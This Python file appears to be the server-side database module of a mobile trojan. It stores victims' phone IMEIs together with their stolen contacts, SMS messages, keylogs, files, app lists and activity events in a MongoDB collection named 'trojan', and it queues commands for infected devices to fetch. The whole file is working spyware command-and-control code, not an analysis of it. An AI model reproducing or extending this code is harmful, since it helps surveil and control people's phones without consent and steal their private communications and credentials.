### thil file will handle database conections
import pymongo
from .config import MONGO_LINK
from bson.objectid import ObjectId


class MongoClient:
    def __init__(self):
        self.client = pymongo.MongoClient(MONGO_LINK)
        self.db = self.client.get_database("mobile")
        self.coll = self.db.get_collection("trojan")

    def add_imei(self, imei):
        doc = self.coll.find_one({'imei': imei})
        if doc:
            return str(doc['_id'])
        else:
            result = self.coll.insert_one({"imei": imei, "apps": [], "cmd": [], "contacts": [], "events": {'user present event': []}, "sms": [], "keylog": [], 'files': []})
            return str(result.inserted_id)

    def add_command(self, _id, cmd):
        result = self.coll.update_one({'_id': ObjectId(_id)}, {'$push': {'cmd': cmd}})
        if result.modified_count == 1:
            return True
        return False

    def get_commands_for_id(self, _id):
        return self.get_data_for_id(_id, 'cmd')

    def add_data_for_id(self, _id, data, data_type):
        if not isinstance(data, list):
            data = [data]
        obj_id = ObjectId(_id)
        doc = self.coll.find_one({'_id': obj_id})
        if doc:
            partial_data = doc[data_type]
            data += partial_data
            res = self.coll.update_one({'_id': obj_id}, {'$set': {data_type: data}})
            if res.modified_count:
                return True
        return False

    def get_data_for_id(self, _id, data_type):
        obj_id = ObjectId(_id)
        doc = self.coll.find_one({'_id': obj_id})
        result = []
        if doc:
            result = doc[data_type]
        return result

    def add_contacts_for_id(self, _id, contacts):
        return self.add_data_for_id(_id, contacts, 'contacts')

    def add_apps_for_id(self, _id, apps):
        return self.add_data_for_id(_id, apps, 'apps')

    @staticmethod
    def merge_dicts(d1: dict, d2: dict):
        for key, value in d2.items():
            if key in d1:
                d1[key].extend(d2[key])
            else:
                d1[key] = d2[key]

    def add_events_for_id(self, _id, events: dict):
        obj_id = ObjectId(_id)
        doc = self.coll.find_one({'_id': obj_id})
        if doc:
            new_entry = doc['events']
            MongoClient.merge_dicts(new_entry, events)
            res = self.coll.update_one({'_id': obj_id}, {'$set': {'events': new_entry}})
            if res.modified_count:
                return True
        return False

    def add_sms_for_id(self, _id, sms):
        return self.add_data_for_id(_id, sms, 'sms')

    def add_keylogs_for_id(self, _id, keylog):
        return self.add_data_for_id(_id, keylog, 'keylog')

    def add_files_for_id(self, _id, files):
        return self.add_data_for_id(_id, files, 'files')

    def get_files_for_id(self, _id):
        return self.get_data_for_id(_id, 'files')

    def get_contacts_for_id(self, _id):
        return self.get_data_for_id(_id, 'contacts')

    def get_apps_for_id(self, _id):
        return self.get_data_for_id(_id, 'apps')

    def get_events_for_id(self, _id):
        return self.get_data_for_id(_id, 'events')

    def get_sms_for_id(self, _id):
        return self.get_data_for_id(_id, 'sms')

    def get_keylog_for_id(self, _id):
        return self.get_data_for_id(_id, 'keylog')

    def get_command_for_id(self, _id):
        obj_id = ObjectId(_id)
        doc = self.coll.find_one({'_id': obj_id})
        if doc:
            cmds = doc['cmd']
            if cmds:
                cmd = cmds.pop(0)
                self.coll.update_one({'_id': obj_id}, {'$set': {'cmd': cmds}})
                return cmd
        return 'w'




def key_exists(key):
    return False


def update_database(data):
    return True


def get_key_for_imei(imei):
    return 'key'


def register_file(imei, file, filepat):
    return True


def register_contacts(imei, contacts):
    return True


def get_secret():
    return 'a'


def get_command_for_key(key):
    d = open('com').read()
    if d != 'w':
        open('com', 'w').write('w')
    return d
